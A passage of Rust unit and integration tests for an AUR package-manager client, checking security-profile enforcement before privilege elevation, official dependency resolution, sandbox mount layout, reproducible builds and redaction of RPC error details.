                        profile: AurSecurityProfile::Hardened,
                        requested_outputs: BTreeSet::from(["demo".to_owned()]),
                    },
                    accepted,
                ];
                let error = AurClient::install_built_packages(&wave, None)
                    .await
                    .expect_err(
                        "a hardened first batch must not authorize a standard second batch",
                    );
                assert!(
                    error
                        .to_string()
                        .contains("built under the Standard AUR profile"),
                    "{error:#}"
                );
                Ok(())
            })
        })
    }

    fn write_review_repository(
        database: &Path,
        repository: &str,
        version: &str,
        provided: &str,
    ) -> Result<()> {
        let desc = format!(
            "%NAME%\nhelper\n\n%VERSION%\n{version}\n\n%DESC%\nreview fixture\n\n%ARCH%\nany\n\n%PROVIDES%\n{provided}\n\n"
        );
        let encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        let mut archive = tar::Builder::new(encoder);
        let mut header = tar::Header::new_gnu();
        header.set_size(desc.len() as u64);
        header.set_mode(0o644);
        header.set_cksum();
        archive.append_data(
            &mut header,
            format!("helper-{version}/desc"),
            desc.as_bytes(),
        )?;
        std::fs::write(
            database.join("sync").join(format!("{repository}.db")),
            archive.into_inner()?.finish()?,
        )?;
        Ok(())
    }

    #[test]
    fn review_official_classification_requires_complete_install_catalog() -> Result<()> {
        const TEST: &str = "package_managers::aur::client::tests::review_official_classification_requires_complete_install_catalog";
        if crate::core::testing::run_isolated_test(TEST) || Settings::rerun_test_unprivileged(TEST)
        {
            return Ok(());
        }
        let fixture = S72Fixture::new(&[])?;
        std::fs::create_dir_all(fixture.db.join("local"))?;
        std::fs::write(fixture.db.join("local/ALPM_DB_VERSION"), "9\n")?;
        write_review_repository(&fixture.db, "low", "2-1", "virtual-helper=2")?;
        let alpm = alpm::Alpm::new(
            fixture
                .directory
                .path()
                .join("root")
                .to_str()
                .context("fixture root is not UTF-8")?,
            fixture
                .db
                .to_str()
                .context("fixture database is not UTF-8")?,
        )?;
        let missing = alpm.register_syncdb("missing", alpm::SigLevel::NONE)?;
        missing.set_usage(alpm::Usage::SEARCH)?;
        alpm.register_syncdb("low", alpm::SigLevel::NONE)?;
        assert_eq!(
            resolve_official_dependency(&alpm, "helper>=2")?
                .context("low helper must be selected")?
                .repository,
            "low"
        );
        assert_eq!(resolve_official_dependency(&alpm, "aur-helper")?, None);
        missing.set_usage(alpm::Usage::INSTALL)?;
        for relation in ["aur-helper", "helper>=2"] {
            let error = resolve_official_dependency(&alpm, relation)
                .expect_err("an unavailable eligible repository cannot prove absence or select a lower repository");
            assert!(
                format!("{error:#}").contains("missing"),
                "{relation}: {error:#}"
            );
        }
        std::fs::write(
            &fixture.conf,
            "[options]\nSigLevel = Never\n[missing]\n[low]\n",
        )?;
        std::fs::write(fixture.directory.path().join("PKGBUILD"), "pkgname=demo\n")?;
        fixture.with_environment(async {
            S72Fixture::index(&["aur-helper"])?;
            let client = fixture.client();
            assert!(client.info("aur-helper").await?.is_some(), "same-named AUR candidate exists");
            std::fs::write(fixture.directory.path().join(".SRCINFO"), "pkgbase = demo\npkgver = 1\npkgrel = 1\narch = any\npkgname = demo\ndepends = aur-helper\n")?;
            let error = client.aur_dependency_plan(&ReviewedSource::capture(fixture.directory.path())?, "demo", &["demo".to_owned()]).await
                .expect_err("incomplete official classification must fail before accepting the AUR candidate");
            assert!(format!("{error:#}").contains("missing"), "{error:#}");
            Ok(())
        })
    }

    #[test]
    fn review_official_plan_combines_constraints_for_one_selected_identity() -> Result<()> {
        const TEST: &str = "package_managers::aur::client::tests::review_official_plan_combines_constraints_for_one_selected_identity";
        if crate::core::testing::run_isolated_test(TEST) || Settings::rerun_test_unprivileged(TEST)
        {
            return Ok(());
        }
        let fixture = S72Fixture::new(&[])?;
        std::fs::create_dir_all(fixture.db.join("local"))?;
        std::fs::write(fixture.db.join("local/ALPM_DB_VERSION"), "9\n")?;
        write_review_repository(&fixture.db, "high", "1-1", "virtual-helper=5")?;
        write_review_repository(&fixture.db, "low", "2-1", "virtual-helper=10")?;
        write_review_repository(&fixture.db, "search-only", "99-1", "virtual-helper=99")?;
        write_tar_gz(&fixture.db.join("sync/empty.db"), &[]);
        std::fs::write(
            &fixture.conf,
            "[options]\nSigLevel = Never\n[search-only]\nUsage = Search\n[empty]\n[high]\n[low]\n",
        )?;
        std::fs::write(fixture.directory.path().join("PKGBUILD"), "pkgname=demo\n")?;
        fixture.with_environment(async {
            let client = fixture.client();
            for relations in [["helper>=1", "helper>=2"], ["helper>=2", "virtual-helper>=10"], ["virtual-helper>=1", "virtual-helper>=10"]] {
                std::fs::write(fixture.directory.path().join(".SRCINFO"), format!("pkgbase = demo\npkgver = 1\npkgrel = 1\narch = any\npkgname = demo\ndepends = {}\ndepends = {}\n", relations[0], relations[1]))?;
                let plan = client.aur_dependency_plan(&ReviewedSource::capture(fixture.directory.path())?, "demo", &["demo".to_owned()]).await?;
                assert!(plan.aur_dependencies.is_empty(), "official relations must not fall back to AUR");
                assert_eq!(plan.official_dependencies, vec![OfficialTarget {
                    repository: "low".to_owned(),
                    name: "helper".to_owned(),
                    relations: relations.map(str::to_owned).to_vec(),
                }], "all constraints must select one coherent package for {relations:?}");
                InstallRequest::new(plan.official_dependencies.into_iter().map(|selected| InstallItem {
                    target: InstallTarget::Resolved(selected),
                    intent: InstallIntent::Automatic,
                }).collect())?;
            }
            S72Fixture::index(&["aur-helper"])?;
            std::fs::write(fixture.directory.path().join(".SRCINFO"), "pkgbase = demo\npkgver = 1\npkgrel = 1\narch = any\npkgname = demo\ndepends = aur-helper\n")?;
            let plan = client.aur_dependency_plan(&ReviewedSource::capture(fixture.directory.path())?, "demo", &["demo".to_owned()]).await?;
            assert!(plan.official_dependencies.is_empty());
            assert_eq!(plan.aur_dependencies, ["aur-helper"]);
            std::fs::write(fixture.directory.path().join(".SRCINFO"), "pkgbase = demo\npkgver = 1\npkgrel = 1\narch = any\npkgname = demo\ndepends = helper<2\ndepends = helper>=2\n")?;
            client.aur_dependency_plan(&ReviewedSource::capture(fixture.directory.path())?, "demo", &["demo".to_owned()]).await
                .expect_err("contradictory constraints must fail closed before installation");
            Ok(())
        })
    }

    #[test]
    fn review_queued_install_rechecks_current_profile_before_elevation() -> Result<()> {
        const TEST: &str = "package_managers::aur::client::tests::review_queued_install_rechecks_current_profile_before_elevation";
        if crate::core::testing::run_isolated_test(TEST) || Settings::rerun_test_unprivileged(TEST)
        {
            return Ok(());
        }
        let directory = tempfile::tempdir()?;
        let configuration = directory.path().join("config.toml");
        let socket = directory.path().join("absent.sock");
        std::fs::write(&configuration, "[aur]\nsecurity_profile = 'standard'\n")?;
        let archive = directory.path().join("demo-1-1-any.pkg.tar.gz");
        write_pkg_archive(
            &archive,
            "pkgname = demo\npkgbase = demo\npkgver = 1-1\n",
            None,
        );
        let standard = BuiltPackages {
            archives: vec![ArchiveSnapshot::capture(&archive)?],
            profile: AurSecurityProfile::Standard,
            requested_outputs: BTreeSet::from(["demo".to_owned()]),
        };
        temp_env::with_vars(
            [
                ("OMG_CONFIG_DIR", Some(directory.path().as_os_str())),
                ("OMG_CACHE_DIR", Some(directory.path().as_os_str())),
                ("OMG_SOCKET_PATH", Some(socket.as_os_str())),
                ("CARGO_PRIMARY_PACKAGE", Some(std::ffi::OsStr::new("1"))),
            ],
            || {
                tokio::runtime::Builder::new_current_thread()
                    .enable_all()
                    .build()?
                    .block_on(async {
                        let control = AurClient::install_built_packages(
                            std::slice::from_ref(&standard),
                            None,
                        )
                        .await
                        .expect_err("the admitted Standard control reaches inert elevation");
                        assert!(
                            format!("{control:#}")
                                .contains("Privilege elevation not supported in development mode"),
                            "{control:#}"
                        );
                        let lock = INSTALL_LOCK.lock().await;
                        let mut install = Box::pin(AurClient::install_built_packages(
                            std::slice::from_ref(&standard),
                            None,
                        ));
                        assert!(
                            futures::poll!(install.as_mut()).is_pending(),
                            "the validated Standard batch must wait for INSTALL_LOCK"
                        );
                        std::fs::write(&configuration, "[aur]\nsecurity_profile = 'hardened'\n")?;
                        drop(lock);
                        let error = install.await.expect_err(
                            "queued Standard evidence must fail under the newly Hardened profile",
                        );
                        assert!(
                            format!("{error:#}").contains("built under the Standard AUR profile"),
                            "{error:#}"
                        );
                        Ok(())
                    })
            },
        )
    }

    #[test]
    fn official_dependency_selection_preserves_native_repository_and_relation() -> Result<()> {
        let directory = tempfile::tempdir()?;
        let root = directory.path().join("root");
        let database = directory.path().join("db");
        std::fs::create_dir_all(&root)?;
        std::fs::create_dir_all(database.join("sync"))?;
        for (repository, version) in [("high", "1-1"), ("low", "2-1")] {
            let desc = format!(
                "%NAME%\nhelper\n\n%VERSION%\n{version}\n\n%DESC%\nselected identity fixture\n\n%ARCH%\nany\n\n%PROVIDES%\nvirtual-helper={version}\n\n"
            );
            let encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
            let mut archive = tar::Builder::new(encoder);
            let mut header = tar::Header::new_gnu();
            header.set_size(desc.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            archive.append_data(
                &mut header,
                format!("helper-{version}/desc"),
                desc.as_bytes(),
            )?;
            std::fs::write(
                database.join("sync").join(format!("{repository}.db")),
                archive.into_inner()?.finish()?,
            )?;
        }
        let alpm = alpm::Alpm::new(
            root.to_str().context("fixture root is not UTF-8")?,
            database.to_str().context("fixture database is not UTF-8")?,
        )?;
        alpm.register_syncdb("high", alpm::SigLevel::NONE)?;
        alpm.register_syncdb("low", alpm::SigLevel::NONE)?;
        for (relation, repository) in [
            ("helper", "high"),
            ("helper>=2", "low"),
            ("virtual-helper>=2", "low"),
        ] {
            assert_eq!(
                resolve_official_dependency(&alpm, relation)?,
                Some(OfficialTarget {
                    repository: repository.to_owned(),
                    name: "helper".to_owned(),
                    relations: vec![relation.to_owned()],
                }),
                "native selection for {relation}"
            );
        }
        assert_eq!(resolve_official_dependency(&alpm, "helper>=3")?, None);
        Ok(())
    }

    #[tokio::test]
    #[ignore = "requires an explicitly provisioned disposable native Arch fixture"]
    async fn batch2_native_automatic_dependency_reason() -> Result<()> {
        anyhow::ensure!(
            std::env::var("OMG_ARCH_INSTALL_FIXTURE").as_deref() == Ok("isolated-container"),
            "OMG_ARCH_INSTALL_FIXTURE=isolated-container is required"
        );
        anyhow::ensure!(crate::core::is_root(), "guest fixture requires root");
        let directory = tempfile::tempdir()?;
        let root = directory.path().join("root");
        let database = directory.path().join("db");
        let cache = root.join("var/cache/pacman/pkg");
        for path in [
            root.join("etc/pacman.d/gnupg"),
            database.join("local"),
            database.join("sync"),
            cache.clone(),
        ] {
            std::fs::create_dir_all(path)?;
        }
        std::fs::write(database.join("local/ALPM_DB_VERSION"), "9\n")?;
        let filename = "helper-2-1-any.pkg.tar.gz";
        let package = cache.join(filename);
        write_pkg_archive(
            &package,
            "pkgname = helper\npkgbase = helper\npkgver = 2-1\n",
            None,
        );
        let bytes = std::fs::read(&package)?;
        let desc = format!(
            "%NAME%\nhelper\n\n%VERSION%\n2-1\n\n%DESC%\ninert automatic dependency fixture\n\n%ARCH%\nany\n\n%FILENAME%\n{filename}\n\n%CSIZE%\n{}\n\n%ISIZE%\n0\n\n%SHA256SUM%\n{}\n\n",
            bytes.len(),
            hex::encode(Sha256::digest(&bytes))
        );
        write_tar_gz(
            &database.join("sync/omg-fixture.db"),
            &[("helper-2-1/desc", desc.as_bytes())],
        );
        let configuration = directory.path().join("pacman.conf");
        std::fs::write(
            &configuration,
            format!(
                "[options]\nArchitecture = auto\nSigLevel = Never\n[omg-fixture]\nSigLevel = Never\nServer = file://{}\n",
                cache.display()
            ),
        )?;
        nix::sched::unshare(nix::sched::CloneFlags::CLONE_NEWNS)?;
        assert!(
            std::process::Command::new("mount")
                .args(["--make-rprivate", "/"])
                .status()?
                .success()
        );
        assert!(
            std::process::Command::new("mount")
                .arg("--bind")
                .arg(&configuration)
                .arg("/etc/pacman.conf")
                .status()?
                .success()
        );
        crate::core::paths::set_test_overrides(Some(root.clone()), Some(database.clone()));
        let before = alpm::Alpm::new(
            root.to_str().context("fixture root")?,
            database.to_str().context("fixture database")?,
        )?;
        assert_eq!(before.localdb().pkgs().len(), 0);
        drop(before);
        let selected = crate::package_managers::alpm_direct::with_handle(|alpm| {
            resolve_official_dependency(alpm, "helper>=2")?
                .context("fixture helper is absent from sync repositories")
        })?;
        assert_eq!(selected.repository, "omg-fixture");
        AurClient::install_official_dependencies(std::slice::from_ref(&selected)).await?;
        let after = alpm::Alpm::new(
            root.to_str().context("fixture root")?,
            database.to_str().context("fixture database")?,
        )?;
        assert_eq!(after.localdb().pkgs().len(), 1);
        assert_eq!(
            after.localdb().pkg("helper")?.reason(),
            alpm::PackageReason::Depend,
            "new official AUR build dependencies must remain eligible for orphan cleanup"
        );
        drop(after);
        use crate::package_managers::traits::PackageManager;
        crate::package_managers::ArchPackageManager::new()
            .install(&["omg-fixture/helper".to_owned()])
            .await?;
        AurClient::install_official_dependencies(&[selected]).await?;
        let promoted = alpm::Alpm::new(
            root.to_str().context("fixture root")?,
            database.to_str().context("fixture database")?,
        )?;
        assert_eq!(
            promoted.localdb().pkg("helper")?.reason(),
            alpm::PackageReason::Explicit,
            "an automatic build dependency request must preserve an existing explicit reason"
        );
        drop(promoted);
        let mut archives = Vec::new();
        for name in ["omg-fixture-app", "omg-fixture-libs"] {
            let archive = directory.path().join(format!("{name}-1-1-any.pkg.tar.gz"));
            write_pkg_archive(
                &archive,
                &format!("pkgname = {name}\npkgbase = omg-fixture-split\npkgver = 1-1\n"),
                None,
            );
            archives.push(ArchiveSnapshot::capture(&archive)?);
        }
        let mut batch = BuiltPackages {
            archives,
            profile: AurSecurityProfile::Hardened,
            requested_outputs: BTreeSet::from(["omg-fixture-app".to_owned()]),
        };
        AurClient::install_built_packages(std::slice::from_ref(&batch), None).await?;
        let installed = || -> Result<Vec<(String, alpm::PackageReason)>> {
            let alpm = alpm::Alpm::new(
                root.to_str().context("fixture root")?,
                database.to_str().context("fixture database")?,
            )?;
            let mut packages = alpm
                .localdb()
                .pkgs()
                .iter()
                .map(|package| (package.name().to_owned(), package.reason()))
                .collect::<Vec<_>>();
            packages.sort_by(|left, right| left.0.cmp(&right.0));
            Ok(packages)
        };
        use alpm::PackageReason::{Depend, Explicit};
        assert_eq!(
            installed()?,
            vec![
                ("helper".to_owned(), Explicit),
                ("omg-fixture-app".to_owned(), Explicit),
                ("omg-fixture-libs".to_owned(), Depend),
            ],
            "only requested outputs from an admitted build batch become explicit"
        );
        batch.requested_outputs.clear();
        AurClient::install_built_packages(std::slice::from_ref(&batch), None).await?;
        assert_eq!(
            installed()?[1].1,
            Explicit,
            "an automatic rebuild must not demote an existing explicit split output"
        );
        batch
            .requested_outputs
            .insert("omg-fixture-libs".to_owned());
        AurClient::install_built_packages(std::slice::from_ref(&batch), None).await?;
        assert!(installed()?.iter().all(|(_, reason)| *reason == Explicit));
        Ok(())
    }

    #[test]
    fn final_install_rechecks_current_hardened_profile_before_elevation() -> Result<()> {
        const TEST: &str = "package_managers::aur::client::tests::final_install_rechecks_current_hardened_profile_before_elevation";
        if Settings::rerun_test_unprivileged(TEST) || crate::core::testing::run_isolated_test(TEST)
        {
            return Ok(());
        }
        let directory = tempfile::tempdir()?;
        let archive = directory.path().join("demo-1-1-any.pkg.tar.gz");
        write_pkg_archive(
            &archive,
            "pkgname = demo\npkgbase = demo\npkgver = 1-1\narch = any\n",
            Some("post_install() { :; }\n"),
        );
        let snapshot = ArchiveSnapshot::capture(&archive)?;
        std::fs::write(
            directory.path().join("config.toml"),
            "[aur]\nsecurity_profile = 'hardened'\n",
        )
        .expect("write fixture file");
        temp_env::with_var("OMG_CONFIG_DIR", Some(directory.path()), || {
            let runtime = tokio::runtime::Builder::new_current_thread()
                .enable_all()
                .build()?;
            let error = runtime
                .block_on(AurClient::install_built_packages(
                    &[BuiltPackages {
                        archives: vec![snapshot],
                        profile: AurSecurityProfile::Hardened,
                        requested_outputs: BTreeSet::from(["demo".to_owned()]),
                    }],
                    None,
                ))
                .expect_err("the current hardened profile must reject hooks before elevation");
            assert!(
                error.to_string().contains("Hardened AUR profile rejects"),
                "{error:#}"
            );
            Ok(())
        })
    }

    #[test]
    fn sandbox_build_root_keeps_existing_mounts_visible_and_identity_stable() -> Result<()> {
        let first = [
            Path::new("/omg-build/checkout"),
            Path::new("/cache/first/packages"),
        ];
        let second = [
            Path::new("/omg-build/checkout"),
            Path::new("/cache/second/packages"),
        ];
        let root = sandbox_build_root(&first)?;
        for destination in first {
            let diagnostic = format!(
                "build root {} must not obscure mount {}",
                root.display(),
                destination.display()
            );
            assert!(
                !destination.starts_with(&root) && !root.starts_with(destination),
                "{diagnostic}"
            );
        }
        assert_eq!(root, sandbox_build_root(&second)?);
        assert_eq!(
            sandbox_build_root(&[Path::new("/omg-builder/cache")])?,
            Path::new(SANDBOX_BUILD_ROOT)
        );
        assert!(sandbox_build_root(&[Path::new("/")]).is_err());
        Ok(())
    }

    #[test]
    fn paired_output_verification_is_order_independent_and_exact() {
        let first = vec![paired_fixture("app", "aa"), paired_fixture("libs", "bb")];
        let reversed = vec![paired_fixture("libs", "bb"), paired_fixture("app", "aa")];
        AurClient::verify_paired_outputs(&first, &reversed).expect("same exact outputs");

        let changed = vec![paired_fixture("app", "aa"), paired_fixture("libs", "cc")];
        let error = AurClient::verify_paired_outputs(&first, &changed)
            .expect_err("one changed byte hash must reject the pair");
        assert!(error.to_string().contains("byte-for-byte"));
    }

    #[test]
    fn reproducible_epoch_is_stable_and_rejects_invalid_digests() {
        let digest = "0123456789abcdef".repeat(4);
        let first = reproducible_source_epoch(&digest).expect("valid source digest");
        let second = reproducible_source_epoch(&digest).expect("same source digest");
        assert_eq!(first, second);
        assert!(first.parse::<u64>().is_ok());
        assert!(reproducible_source_epoch("short").is_err());
        assert!(reproducible_source_epoch("not-a-valid-hash!").is_err());
    }
}

#[cfg(test)]
mod empty_rpc_result_tests {
    use super::AurClient;
    use anyhow::Result;
    use tokio::io::{AsyncReadExt, AsyncWriteExt};

    #[tokio::test]
    async fn empty_info_reply_is_a_real_completed_rpc_lookup() -> Result<()> {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await?;
        let endpoint = format!("http://{}/rpc", listener.local_addr()?);
        let server = tokio::spawn(async move {
            let (mut stream, _) = listener.accept().await?;
            let mut bytes = Vec::new();
            while !bytes.windows(4).any(|window| window == b"\r\n\r\n") {
                anyhow::ensure!(bytes.len() < 8192, "RPC fixture header exceeds 8 KiB");
                let mut chunk = [0; 1024];
                let count = stream
                    .read(&mut chunk[..(8192 - bytes.len()).min(1024)])
                    .await?;
                anyhow::ensure!(count > 0, "RPC fixture closed before complete header");
                bytes.extend_from_slice(&chunk[..count]);
            }
            let request = String::from_utf8(bytes)?;
            let body = r#"{"type":"multiinfo","resultcount":0,"results":[]}"#;
            let reply = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
                body.len()
            );
            stream.write_all(reply.as_bytes()).await?;
            anyhow::Ok(request)
        });
        let response = tokio::time::timeout(
            std::time::Duration::from_secs(5),
            AurClient::rpc_info_chunk_at(&endpoint, &["missing-fixture-package".to_owned()]),
        )
        .await??;
        let request = server.await??;
        assert!(request.starts_with("GET /rpc?v=5&type=info&"), "{request}");
        assert!(request.contains("missing-fixture-package"), "{request}");
        assert!(
            response.results.is_empty(),
            "empty successful info is absence, not a transport error"
        );
        eprintln!(
            "AUR empty-info completed request={}",
            request.lines().next().unwrap_or_default()
        );
        Ok(())
    }
}

#[cfg(test)]
mod update_error_tests {
    use super::*;
    use tokio::io::{AsyncReadExt, AsyncWriteExt};

    async fn update_error_from_reply(
        reply: Option<&[u8]>,
        attempts: usize,
    ) -> Result<anyhow::Error> {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await?;
        let endpoint = format!("http://{}/rpc", listener.local_addr()?);
        let reply = reply.map(<[u8]>::to_vec);
        let server = tokio::spawn(async move {
            for _ in 0..attempts {
                let (mut stream, _) = listener.accept().await?;
                let mut request = Vec::new();
                while !request.windows(4).any(|window| window == b"\r\n\r\n") {
                    anyhow::ensure!(request.len() < 8192, "fixture request too large");
                    let mut buffer = [0; 1024];
                    let count = stream.read(&mut buffer).await?;
                    anyhow::ensure!(count > 0, "fixture request incomplete");
                    request.extend_from_slice(&buffer[..count]);
                }
                if let Some(reply) = &reply {
                    stream.write_all(reply).await?;
                }
                stream.shutdown().await?;
            }
            anyhow::Ok(())
        });
        let client = AurClient {
            build_dir: PathBuf::new(),
            settings: Settings::default(),
            package_base_locks: Arc::new(dashmap::DashMap::new()),
        };
        let result = tokio::time::timeout(
            Duration::from_secs(5),
            client.query_aur_updates_at(&endpoint, &["private-package-query".to_owned()]),
        )
        .await?;
        tokio::time::timeout(Duration::from_secs(5), server).await???;
        let error = result.expect_err("failed RPC must fail update discovery");
        for cause in error.chain() {
            let message = cause.to_string();
            assert!(!message.contains("private-package-query"), "{message}");
            assert!(!message.contains("remote-secret"), "{message}");
            assert!(!message.contains(&endpoint), "{message}");
        }
        Ok(error)
    }

    #[tokio::test]
    async fn rate_limited_updates_preserve_http_cause_and_cooldown_guidance() -> Result<()> {
        let error = update_error_from_reply(Some(
            b"HTTP/1.1 429 Too Many Requests\r\nContent-Length: 13\r\nConnection: close\r\n\r\nremote-secret",
        ), 3)
        .await?;
        assert_eq!(
            crate::core::error::suggest_for_anyhow(&error),
            Some("Wait for the cooldown period, then retry your request")
        );
        assert!(format!("{error:#}").contains("HTTP 429"), "{error:#}");
        Ok(())
    }

    #[tokio::test]
    async fn failed_update_transport_preserves_redaction_and_network_guidance() -> Result<()> {
        let error = update_error_from_reply(None, 1).await?;
        assert_eq!(
            crate::core::error::suggest_for_anyhow(&error),
            Some("Check your internet connection and try again")
        );
        assert!(
            format!("{error:#}").contains("AUR RPC transport failed"),
            "{error:#}"
        );
        Ok(())
    }

    #[tokio::test]
    async fn failed_update_http_status_does_not_invent_network_guidance() -> Result<()> {
        let error = update_error_from_reply(Some(
            b"HTTP/1.1 503 Service Unavailable\r\nContent-Length: 0\r\nConnection: close\r\n\r\n",
        ), 3).await?;
        assert!(format!("{error:#}").contains("HTTP 503"), "{error:#}");
        assert_eq!(crate::core::error::suggest_for_anyhow(&error), None);
        Ok(())
    }

    #[tokio::test]
    async fn failed_update_remote_envelope_does_not_leak_or_inject_guidance() -> Result<()> {
        let body = br#"{"type":"error","error":"remote-secret: permission denied","results":[]}"#;
        // This response is deliberately outside the retryable status path.
        let reply = format!(
            "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
            body.len(),
            String::from_utf8_lossy(body)
        );
        let error = update_error_from_reply(Some(reply.as_bytes()), 1).await?;
        assert_eq!(crate::core::error::suggest_for_anyhow(&error), None);
        Ok(())
    }
}
